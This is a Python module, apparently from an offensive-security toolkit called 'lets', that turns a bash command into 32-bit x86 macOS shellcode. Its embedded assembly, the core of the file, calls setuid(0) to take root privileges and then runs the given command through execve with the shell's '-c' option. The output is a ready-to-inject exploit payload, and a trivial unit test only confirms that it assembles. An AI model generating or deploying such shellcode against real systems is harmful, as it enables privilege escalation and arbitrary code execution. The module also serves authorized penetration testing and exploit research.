from lets.module import Module
from lets.extensions.assembly import AssemblyExtension

# Imports required to execute this module
import string


class X86(AssemblyExtension, Module):
    """
    Format a bash command into OSX x86 assembly code.
    """

    def usage(self) -> object:
        """
        Configure an ArgumentParser object with options relevant to the module.

        :return: ArgumentParser object
        """
        parser = super().usage()

        # Customize shell
        parser.add_argument("-s", "--shell",
            help="use the specified shell",
            type=str,
            default="/bin/bash")

        return parser

    def do(self, data:bytes=None, options:dict=None) -> bytes:
        """
        Main functionality.

        Module.do updates self.options with options.

        :param data: Data to be used by module, in bytes
        :param options: Dict of options to be used by module
        :return: Generator containing results of module execution, in bytes
        """
        super().do(data, options)

        # Validate input
        try:
            assert data, "Expecting data"
            assert "shell" in self.options and len(self.options.get("shell")) > 0, "Shell required"
        except AssertionError as e:
            self.throw(e)

        # Build variables
        self.options["sys_setuid_x86"] = 0x17
        self.options["sys_execve_x86"] = 0x3b
        self.options["sys_exit_x86"] = 0x01
        self.options["shell_hex"] = ",".join([hex(byte) for byte in self.options.get("shell").encode()])
        self.options["data_hex"] = ",".join([hex(byte) for byte in data])

        # Build code
        code = """
    jmp get_payload         ; Retrieve pointer to payload
got_payload:
    pop esi                 ; Save pointer to payload in esi

x86:
    xor ebx, ebx            ; Zero out ebx

; 0x17: int setuid(uid_t uid)

    push ebx                ; Set uid_t uid (NULL)
    push ebx                ; Align stack (8)
    xor eax, eax            ; Zero out eax
    mov al, %(sys_setuid_x86)i  ; Prepare sys_setuid
    int 0x80                ; Call sys_setuid
    add esp, 8              ; Fix stack (args)

; 0x3b: int execve(const char *path, char *const argv[], char *const envp[])

    push ebx                ; Terminate pointer array
    push esi                ; Push pointer to payload
    call get_c              ; Push pointer to "-c", 0x00
    .byte 0x2d,0x63,0x00
get_c:
    call get_shell          ; Push pointer to shell
    .byte %(shell_hex)s,0x00
get_shell:
    mov ecx, [esp]          ; Save pointer to shell
    mov edx, esp            ; Prepare args
    push ebx                ; Set char *const envp[] (NULL)
    push edx                ; Set char *const argv[] ({shell, "-c", payload, NULL})
    push ecx                ; Set const char *path (shell)
    push ebx                ; Align stack (16)
    xor eax, eax            ; Zero out eax
    mov al, %(sys_execve_x86)i  ; Prepare sys_execve
    int 0x80                ; Call sys_execve
    add esp, 32             ; Fix stack (args, array[4])

; 0x01: void exit(int status)

    xor eax, eax            ; Zero out eax
    mov al, %(sys_exit_x86)i    ; Prepare sys_exit
    int 0x80                ; Call sys_exit

get_payload:
    call got_payload        ; Push pointer to payload

payload:
    .byte %(data_hex)s,0x00
""" % self.options

        # Assemble code
        yield self.assemble(code, arch="X86", mode="32")

    def test(self):
        """
        Perform unit tests to verify this module's functionality.
        """
        # Test assembly
        self.assertTrue(
            len(b"".join(self.do((string.ascii_letters + string.digits).encode()))) > 0,
            "Unable to assemble code"
            )